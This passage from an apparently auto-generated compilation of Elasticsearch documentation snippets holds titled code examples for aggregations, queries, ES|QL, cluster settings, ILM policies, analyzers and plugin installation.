https://github.com/elastic/elasticsearch/blob/main/modules/apm/METERING.md#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n  MeterRegistry registry;\n  LongCounter longCounter = registry.registerLongCounter(\"es.test.requests.count\", \"a test counter\", \"count\");\n  longCounter.increment();\n  longCounter.incrementBy(1, Map.of(\"name\", \"Alice\"));\n  longCounter.incrementBy(1, Map.of(\"name\", \"Bob\"));\n```\n\n----------------------------------------\n\nTITLE: Multi-Terms Aggregation with Sorting Example\nDESCRIPTION: Example of using multi-terms aggregation with sub-aggregations to group products by genre and product name, sorted by total quantity. The query demonstrates how to combine multiple terms aggregations with a sum sub-aggregation to calculate totals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /products/_search\n{\n  \"aggs\": {\n    \"genres_and_products\": {\n      \"multi_terms\": {\n        \"terms\": [\n          {\n            \"field\": \"genre\"\n          },\n          {\n            \"field\": \"product\"\n          }\n        ],\n        \"order\": {\n          \"total_quantity\": \"desc\"\n        }\n      },\n      \"aggs\": {\n        \"total_quantity\": {\n          \"sum\": {\n            \"field\": \"quantity\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\" : {\n    \"genres_and_products\" : {\n      \"doc_count_error_upper_bound\" : 0,\n      \"sum_other_doc_count\" : 0,\n      \"buckets\" : [\n        {\n          \"key\" : [\n            \"jazz\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"jazz|Product B\",\n          \"doc_count\" : 1,\n          \"total_quantity\" : {\n            \"value\" : 10.0\n          }\n        },\n        {\n          \"key\" : [\n            \"rock\",\n            \"Product A\"\n          ],\n          \"key_as_string\" : \"rock|Product A\",\n          \"doc_count\" : 2,\n          \"total_quantity\" : {\n            \"value\" : 9.0\n          }\n        },\n        {\n          \"key\" : [\n            \"electronic\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"electronic|Product B\",\n          \"doc_count\" : 1,\n          \"total_quantity\" : {\n            \"value\" : 3.0\n          }\n        },\n        {\n          \"key\" : [\n            \"rock\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"rock|Product B\",\n          \"doc_count\" : 1,\n          \"total_quantity\" : {\n            \"value\" : 1.0\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Local Preference Search Query in Elasticsearch\nDESCRIPTION: Example of performing a search query with a _local preference parameter to restrict searches to shards on the local node. Includes a match query to find documents by user.id.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-shard-routing.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?preference=_local\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including ST_INTERSECTS Function Parameters in Markdown\nDESCRIPTION: This code snippet includes the parameters documentation for the ST_INTERSECTS function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_intersects.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/st_intersects.md\n:::\n```\n\n----------------------------------------\n\nTITLE: DATE_FORMAT Example: Format DateTime\nDESCRIPTION: Illustrates formatting a datetime using DATE_FORMAT with a detailed pattern. This example shows how to format a datetime including milliseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_37\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_FORMAT(CAST('2020-04-05T11:22:33.987654' AS DATETIME), '%d/%m/%Y %H:%i:%s.%f') AS \\\"datetime\\\";\\n\\n      datetime\n------------------\n05/04/2020 11:22:33.987654\"\n```\n\n----------------------------------------\n\nTITLE: Setting HTTP Port in Elasticsearch YAML\nDESCRIPTION: Specifies the port to bind for HTTP client communication. Accepts a single value or a range. If a range is given, the node binds to the first available port in the range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.port: 9200-9300\n```\n\n----------------------------------------\n\nTITLE: Basic Percentile Ranks Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates how to perform a basic percentile ranks aggregation on a numeric field to calculate the percentage of values below specified thresholds (500ms and 600ms).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-rank-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_ranks\": {\n      \"percentile_ranks\": {\n        \"field\": \"load_time\",\n        \"values\": [ 500, 600 ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-Source Composite Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows a composite aggregation with multiple sources, including a terms aggregation on user_name and a date histogram on timestamp. It illustrates how multiple sources can be optimized when they match the index sort.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"user_name\": { \"terms\": { \"field\": \"user_name\" } } },\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\", \"order\": \"desc\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Multiple Functions with Function Score in Elasticsearch\nDESCRIPTION: This snippet shows how to combine multiple scoring functions within a function_score query. It employs filters for specific match conditions and defines weights for scoring, utilizing parameters such as max_boost and score_mode for score combination.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"query\": { \"match_all\": {} }, <1>\n      \"boost\": \"5\",\n      \"functions\": [\n        {\n          \"filter\": { \"match\": { \"test\": \"bar\" } },\n          \"random_score\": {}, <2>\n          \"weight\": 23\n        },\n        {\n          \"filter\": { \"match\": { \"test\": \"cat\" } },\n          \"weight\": 42\n        }\n      ],\n      \"max_boost\": 42,\n      \"score_mode\": \"max\",\n      \"boost_mode\": \"multiply\",\n      \"min_score\": 42\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-match with best_fields and Operator\nDESCRIPTION: This snippet demonstrates the use of the `operator` parameter with the `best_fields` type. It shows that the `operator` is applied to each field individually, requiring all terms to be present in a single field to match.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"Will Smith\",\n      \"type\":       \"best_fields\",\n      \"fields\":     [ \"first_name\", \"last_name\" ],\n      \"operator\":   \"and\" <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index Mapping for Sorting in Elasticsearch\nDESCRIPTION: Defines an index mapping with various field types to demonstrate sorting capabilities. Includes date, keyword, and integer fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"post_date\": { \"type\": \"date\" },\n      \"user\": {\n        \"type\": \"keyword\"\n      },\n      \"name\": {\n        \"type\": \"keyword\"\n      },\n      \"age\": { \"type\": \"integer\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Plugins in Batch Mode in Elasticsearch\nDESCRIPTION: Demonstrates how to install plugins in batch mode, which automatically grants all requested permissions without requiring user confirmation. This is useful for automated installation scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/_other_command_line_parameters.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install --batch [pluginname]\n```\n\n----------------------------------------\n\nTITLE: Range Aggregation with Sub-aggregation in Elasticsearch\nDESCRIPTION: Shows how to combine range aggregation with a stats sub-aggregation to compute statistics for each price range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"aggs\": {\n    \"price_ranges\": {\n      \"range\": {\n        \"field\": \"price\",\n        \"ranges\": [\n          { \"to\": 100 },\n          { \"from\": 100, \"to\": 200 },\n          { \"from\": 200 }\n        ]\n      },\n      \"aggs\": {\n        \"price_stats\": {\n          \"stats\": { \"field\": \"price\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Basic Role Descriptor with Monitor and Read Permissions in Elasticsearch\nDESCRIPTION: This role descriptor grants cluster monitor permission and read/create index privileges on 'test*' indices with field security and a match_all query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/audit/logfile/audited_roles.txt#2025-04-22_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\"cluster\":[\"monitor\"],\"indices\":[{\"names\":[\"test*\"],\"privileges\":[\"read\",\"create_index\"],\"field_security\":{\"grant\":[\"grantedField1\"]},\"query\":\"{\\\"match_all\\\":{}}\",\"allow_restricted_indices\":true}],\"applications\":[],\"run_as\":[]}\n```\n\n----------------------------------------\n\nTITLE: Configuring Self-Generated License Type in Elasticsearch YAML\nDESCRIPTION: Configuration setting that determines the type of self-generated license for Elasticsearch. Can be set to 'basic' for default X-Pack features or 'trial' for full feature access for 30 days.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/license-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.license.self_generated.type: basic\n```\n\n----------------------------------------\n\nTITLE: RLIKE Regular Expression Matching in ESQL\nDESCRIPTION: Example demonstrating the usage of RLIKE operator for pattern matching using regular expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/where.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nWHERE field RLIKE \"regex_pattern\"\n```\n\n----------------------------------------\n\nTITLE: Filtering with Boolean Query in Elasticsearch\nDESCRIPTION: Demonstrates using a bool query with filter clauses to find red Gucci shirts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/filter-search-results.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /shirts/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": [\n        { \"term\": { \"color\": \"red\"   }},\n        { \"term\": { \"brand\": \"gucci\" }}\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Gateway Recovery Settings in Elasticsearch YAML\nDESCRIPTION: Example configuration for Elasticsearch's gateway recovery settings in elasticsearch.yml. Specifies the expected number of data nodes, recovery timeout, and minimum data nodes required for recovery to begin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/local-gateway.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ngateway.expected_data_nodes: 3\ngateway.recover_after_time: 600s\ngateway.recover_after_data_nodes: 3\n```\n\n----------------------------------------\n\nTITLE: Nested kNN Query in Elasticsearch\nDESCRIPTION: Illustrates the use of a kNN query within a nested query structure, allowing vector searches within nested documents. This snippet showcases using the `nested` query and applying `knn` for precise searching on nested vector fields. Limitations include constraints on nested field metadata filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-knn-query.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"query\" : {\n    \"nested\" : {\n      \"path\" : \"paragraph\",\n        \"query\" : {\n          \"knn\": {\n            \"query_vector\": [\n                0.45,\n                45\n            ],\n            \"field\": \"paragraph.vector\",\n            \"num_candidates\": 2\n        }\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Installing GCE Discovery Plugin for Elasticsearch\nDESCRIPTION: This command installs the GCE Discovery plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install discovery-gce\n```\n\n----------------------------------------\n\nTITLE: Installing ICU Analysis Plugin for Elasticsearch\nDESCRIPTION: Example of installing a specific core plugin (ICU analysis plugin) using the elasticsearch-plugin utility. This command automatically matches the plugin version to your Elasticsearch version and displays a progress bar during download.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/installation.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-icu\n```\n\n----------------------------------------\n\nTITLE: Create index API request using the stop filter\nDESCRIPTION: This snippet demonstrates how to use the `stop` filter to configure a new custom analyzer. The custom analyzer `my_analyzer` uses the `whitespace` tokenizer and the `stop` filter.  This analyzer is then associated with the index `my-index-000001`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"stop\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Suggestions with Geo Location Context in Elasticsearch\nDESCRIPTION: This example illustrates how to query suggestions using geo location context in Elasticsearch. It shows how to filter suggestions based on their proximity to a specified geo point, using the completion suggester.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_25\n\nLANGUAGE: console\nCODE:\n```\nPOST place/_search\n{\n  \"suggest\": {\n    \"place_suggestion\": {\n      \"prefix\": \"tim\",\n      \"completion\": {\n        \"field\": \"suggest\",\n        \"size\": 10,\n        \"contexts\": {\n          \"location\": {\n            \"lat\": 43.662,\n            \"lon\": -79.380\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TF-IDF with Scripted Similarity in Elasticsearch\nDESCRIPTION: A complete example of setting up a custom TF-IDF similarity model using Elasticsearch's scripted similarity. This defines a custom algorithm in the settings, applies it to a field in the mappings, adds sample documents, and demonstrates searching with explanations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"number_of_shards\": 1,\n    \"similarity\": {\n      \"scripted_tfidf\": {\n        \"type\": \"scripted\",\n        \"script\": {\n          \"source\": \"double tf = Math.sqrt(doc.freq); double idf = Math.log((field.docCount+1.0)/(term.docFreq+1.0)) + 1.0; double norm = 1/Math.sqrt(doc.length); return query.boost * tf * idf * norm;\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"field\": {\n        \"type\": \"text\",\n        \"similarity\": \"scripted_tfidf\"\n      }\n    }\n  }\n}\n\nPUT /index/_doc/1\n{\n  \"field\": \"foo bar foo\"\n}\n\nPUT /index/_doc/2\n{\n  \"field\": \"bar baz\"\n}\n\nPOST /index/_refresh\n\nGET /index/_search?explain=true\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"foo^1.7\",\n      \"default_field\": \"field\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Complex Sparse Vector Query with Boolean Clauses\nDESCRIPTION: Shows how to combine multiple sparse vector queries with other query types using boolean query clauses and linear boosting\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-sparse-vector-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"sparse_vector\": {\n            \"field\": \"ml.inference.title_expanded.predicted_value\",\n            \"inference_id\": \"my-elser-model\",\n            \"query\": \"How is the weather in Jamaica?\",\n            \"boost\": 1\n          }\n        },\n        {\n          \"sparse_vector\": {\n            \"field\": \"ml.inference.description_expanded.predicted_value\",\n            \"inference_id\": \"my-elser-model\",\n            \"query\": \"How is the weather in Jamaica?\",\n            \"boost\": 1\n          }\n        },\n        {\n          \"multi_match\": {\n            \"query\": \"How is the weather in Jamaica?\",\n            \"fields\": [\n              \"title\",\n              \"description\"\n            ],\n            \"boost\": 4\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Data Stream Mapping in Elasticsearch JSON\nDESCRIPTION: This JSON structure defines the mapping for a data stream in Elasticsearch. It specifies field types, properties, and metadata for various data fields, including timestamps and specific data attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/lz4/licenses/lz4-java-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"_doc\": {\n    \"_meta\": {\n      \"beat\": \"metricbeat\",\n      \"type\": \"doc\",\n      \"version\": \"7.0.0-alpha1\"\n    },\n    \"date_detection\": false,\n    \"dynamic_templates\": [\n      {\n        \"strings_as_keyword\": {\n          \"mapping\": {\n            \"ignore_above\": 1024,\n            \"type\": \"keyword\"\n          },\n          \"match_mapping_type\": \"string\"\n        }\n      }\n    ],\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"data_stream\": {\n        \"properties\": {\n          \"dataset\": {\n            \"type\": \"constant_keyword\"\n          },\n          \"namespace\": {\n            \"type\": \"constant_keyword\"\n          },\n          \"type\": {\n            \"type\": \"constant_keyword\"\n          }\n        }\n      },\n      \"ecs\": {\n        \"properties\": {\n          \"version\": {\n            \"ignore_above\": 1024,\n            \"type\": \"keyword\"\n          }\n        }\n      },\n      \"event\": {\n        \"properties\": {\n          \"dataset\": {\n            \"ignore_above\": 1024,\n            \"type\": \"keyword\"\n          },\n          \"module\": {\n            \"ignore_above\": 1024,\n            \"type\": \"keyword\"\n          }\n        }\n      },\n      \"metricset\": {\n        \"properties\": {\n          \"name\": {\n            \"ignore_above\": 1024,\n            \"type\": \"keyword\"\n          },\n          \"period\": {\n            \"type\": \"long\"\n          }\n        }\n      },\n      \"source\": {\n        \"properties\": {\n          \"ip\": {\n            \"type\": \"ip\"\n          }\n        }\n      },\n      \"version\": {\n        \"type\": \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Concatenating Multi-Valued String with Delimiter in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the MV_CONCAT function in ESQL. It takes a multi-valued string column 'a' and concatenates its values into a single string 'j', using ', ' as the delimiter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_concat.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"zoo\", \"bar\"]\n| EVAL j = MV_CONCAT(a, \", \")\n```\n\n----------------------------------------\n\nTITLE: Configuring Authentication Realms in Elasticsearch YAML\nDESCRIPTION: Example configuration showing how to set up multiple authentication realms with different types and priorities in the realm chain. Demonstrates native, LDAP, and Active Directory realm configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.authc.realms:\n\n    native.realm1:\n        order: 0\n        ...\n\n    ldap.realm2:\n        order: 1\n        ...\n\n    active_directory.realm3:\n        order: 2\n        ...\n    ...\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Shard Rebalancing Settings in Elasticsearch\nDESCRIPTION: Core settings that control when and how shards can be rebalanced across the cluster. Includes settings for allowing rebalancing, enabling/disabling specific shard types, concurrent rebalance limits, and allocation algorithm selection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.allow_rebalance: always\ncluster.routing.rebalance.enable: all\ncluster.routing.allocation.cluster_concurrent_rebalance: 2\ncluster.routing.allocation.type: desired_balance\n```\n\n----------------------------------------\n\nTITLE: Implementing Bulgarian Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: Creates a custom analyzer that replicates the functionality of the built-in Bulgarian analyzer, showing the configuration of Bulgarian-specific stopwords, keyword marking for stem exclusion, and Bulgarian stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /bulgarian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"bulgarian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_bulgarian_\" \n        },\n        \"bulgarian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"пример\"] \n        },\n        \"bulgarian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"bulgarian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_bulgarian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"bulgarian_stop\",\n            \"bulgarian_keywords\",\n            \"bulgarian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Local Exporter for Elasticsearch Monitoring\nDESCRIPTION: Example YAML configuration for setting up a local exporter in Elasticsearch monitoring. This snippet shows how to define a local exporter named 'my_local' with default settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/monitoring-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.monitoring.exporters.my_local:\n  type: local\n```\n\n----------------------------------------\n\nTITLE: Calculating Percentile with Multi-Valued Column in ESQL\nDESCRIPTION: Shows how to combine MV_MAX and PERCENTILE functions to calculate the 80th percentile of maximum values from a multi-valued salary_change column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/percentile.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS p80_max_salary_change = PERCENTILE(MV_MAX(salary_change), 80)\n```\n\n----------------------------------------\n\nTITLE: Configuring Delete Action in Elasticsearch ILM Policy\nDESCRIPTION: This snippet demonstrates how to create an ILM policy that includes a Delete action in the delete phase. The Delete action is configured without any additional options, which means it will use default settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-delete.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"delete\": {\n        \"actions\": {\n          \"delete\" : { }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mixing Three Value Sources in Elasticsearch Aggregation\nDESCRIPTION: Shows how to combine three different value sources (terms and date_histogram) in a composite aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"shop\": { \"terms\": { \"field\": \"shop\" } } },\n          { \"product\": { \"terms\": { \"field\": \"product\" } } },\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rollover Based on Index Size\nDESCRIPTION: ILM policy configuration that triggers rollover when the total index size reaches 100GB.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_size\": \"100gb\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Date Formats in Elasticsearch\nDESCRIPTION: Example showing how to configure multiple date formats for a date field, separated by || as a delimiter. The formats are tried in order until a matching one is found.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"date\": {\n        \"type\":   \"date\",\n        \"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring Variables in Painless\nDESCRIPTION: Examples of different variations of variable declaration in Painless, including primitive types, reference types, and arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-variables.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nint x;\nList y;\nint x, y = 5, z;\ndef d;\nint i = 10;\nfloat[] f;\nMap[][] m;\n```\n\n----------------------------------------\n\nTITLE: Constructing a Bool Query from Match Boolean Prefix Query\nDESCRIPTION: This snippet shows the equivalent boolean query that is constructed from the match_bool_prefix query provided earlier. It breaks down the analyzed terms into a should clause with term queries and a prefix query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-bool-prefix-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"GET /_search\\n{\\n  \\\"query\\\": {\\n    \\\"bool\\\" : {\\n      \\\"should\\\": [\\n        { \\\"term\\\": { \\\"message\\\": \\\"quick\\\" }},\\n        { \\\"term\\\": { \\\"message\\\": \\\"brown\\\" }},\\n        { \\\"prefix\\\": { \\\"message\\\": \\\"f\\\"}}\\n      ]\\n    }\\n  }\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Basic Completion Suggester Query in Elasticsearch\nDESCRIPTION: Demonstrates how to perform a basic completion suggester query in Elasticsearch. This example searches for suggestions that start with the prefix 'nir' in the 'suggest' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPOST music/_search?pretty\n{\n  \"suggest\": {\n    \"song-suggest\": {\n      \"prefix\": \"nir\",        <1>\n      \"completion\": {         <2>\n          \"field\": \"suggest\"  <3>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Scripts Structure in Elasticsearch Painless\nDESCRIPTION: This snippet outlines the basic structure of scripts in Elasticsearch's Painless language. It mentions that scripts consist of one or more statements and are executed in a controlled sandbox environment with predefined variables and API access limitations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-scripts.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Scripts [painless-scripts]\n\nScripts are composed of one-to-many [statements](/reference/scripting-languages/painless/painless-statements.md) and are run in a sandbox that determines what local variables are immediately available along with what APIs are allowed.\n```\n\n----------------------------------------\n\nTITLE: Multiple Rescoring in Elasticsearch\nDESCRIPTION: Demonstrates using multiple rescore queries in sequence with different window sizes and scoring modes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/filter-search-results.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n   \"query\" : {\n      \"match\" : {\n         \"message\" : {\n            \"operator\" : \"or\",\n            \"query\" : \"the quick brown\"\n         }\n      }\n   },\n   \"rescore\" : [ {\n      \"window_size\" : 100,\n      \"query\" : {\n         \"rescore_query\" : {\n            \"match_phrase\" : {\n               \"message\" : {\n                  \"query\" : \"the quick brown\",\n                  \"slop\" : 2\n               }\n            }\n         },\n         \"query_weight\" : 0.7,\n         \"rescore_query_weight\" : 1.2\n      }\n   }, {\n      \"window_size\" : 10,\n      \"query\" : {\n         \"score_mode\": \"multiply\",\n         \"rescore_query\" : {\n            \"function_score\" : {\n               \"script_score\": {\n                  \"script\": {\n                    \"source\": \"Math.log10(doc.count.value + 2)\"\n                  }\n               }\n            }\n         }\n      }\n   } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Response from smartcn_stop Token Filter 